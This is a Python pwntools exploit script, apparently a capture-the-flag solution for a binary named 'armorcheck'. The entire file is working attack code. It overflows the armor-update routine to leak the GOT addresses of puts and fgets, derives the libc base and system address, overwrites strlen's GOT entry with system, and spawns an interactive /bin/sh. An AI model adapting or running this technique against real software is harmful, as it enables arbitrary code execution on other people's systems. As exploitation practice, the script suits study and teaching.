# exploit-armorcheck.py
# by N4T_20
from pwn import *
from time import sleep

local = False
debug = False
if local:
    if debug:
        p = gdb.debug('./armorcheck','''
            break *0x400d8c
            break *0x400dd8
            break *0x400e32
            continue
            ''')
        # 0x400d8c: in update armor, after new name has been read in
        # 0x400dd8: in update armor, memcpy for name
        # 0x400e32: in update armor, fgets for reading in new description
    else:
        p = process('./armorcheck')
else:
    p = remote('localhost', 5000)

def createArmor(name, description):
    p.send("1\n")
    p.recvuntil("> ")
    p.send(name + "\n")
    p.recvuntil("> ")
    p.send(description + "\n")
    p.recvuntil("> ")

def updateArmor(index, name, description):
    p.send("2\n")
    p.recvuntil("> ")
    p.send(str(index) + "\n")
    p.recvuntil("> ")
    p.send(name + "\n")
    p.recvuntil("> ")
    p.send(description + "\n")
    p.recvuntil("> ")

def leak_GOT(addr):
    name_payload = "A"*8 + "\x00"
    name_payload += "C"*(20-len(name_payload))
    description_payload = "Rusted silver plate armor of the bear"
    description_payload += "FFF"
    description_payload += p64(0x31)
    description_payload += "D"*16
    description_payload += p64(0x17)
    description_payload += p64(addr)
    updateArmor(0, name_payload, description_payload)
    p.send("3\n")
    p.recvuntil("> ")
    p.send("1\n")
    p.recvuntil("follows:\n   ")
    got_addr = u64(p.recv(6) + "\x00\x00")
    print("Received GOT address: " + hex(got_addr))
    p.recvuntil("> ")
    return(got_addr)

# Requires that I write no more than 16 bytes, lest I mangle the rest of the GOT.
def write_GOT(got_addr, contents):
    got_addr = STRLEN_GOT_ADDR
    name_payload = "A"*8 + "\x00"
    name_payload += "C"*(20-len(name_payload))
    description_payload = "Rusted silver plate armor of the bear"
    description_payload += "FFF"
    description_payload += p64(0x31)
    description_payload += "D"*16
    description_payload += p64(0x17)
    description_payload += p64(got_addr)
    updateArmor(0, name_payload, description_payload)
    got_payload = p64(contents)
    updateArmor(1, "G"*8, got_payload)
    return

def get_shell(index):
    p.send("2\n")
    p.recvuntil("> ")
    p.send(str(index) + "\n")
    p.recvuntil("> ")
    p.send("/bin/sh\x00" + "\n")
    p.interactive()

PUTS_GOT_ADDR = 0x602020
FGETS_GOT_ADDR = 0x602050
STRLEN_GOT_ADDR = 0x602028


p.recvuntil("> ")
createArmor("B"*16, "Rusted silver plate armor of the boar")
createArmor("D"*16, "Awesome +2 plate armor")
PUTS_ADDR = leak_GOT(PUTS_GOT_ADDR)
FGETS_ADDR = leak_GOT(FGETS_GOT_ADDR)

print("PUTS is at " + hex(PUTS_ADDR))
print("FGETS is at " + hex(FGETS_ADDR))
# Use this to fingerprint libc
#p.interactive()
if local:
    PUTS_OFFSET = 0x80a30
    SYSTEM_OFFSET = 0x4f4e0
else:
    PUTS_OFFSET = 0x80a30
    SYSTEM_OFFSET = 0x4f4e0
    
LIBC_BASE = PUTS_ADDR - PUTS_OFFSET
SYSTEM_ADDR = LIBC_BASE + SYSTEM_OFFSET

# We'll overwrite strlen because the next address in the GOT is exit, which we don't call. So we can safely mangle it.
write_GOT(STRLEN_GOT_ADDR, SYSTEM_ADDR)
get_shell(0)


p.interactive()




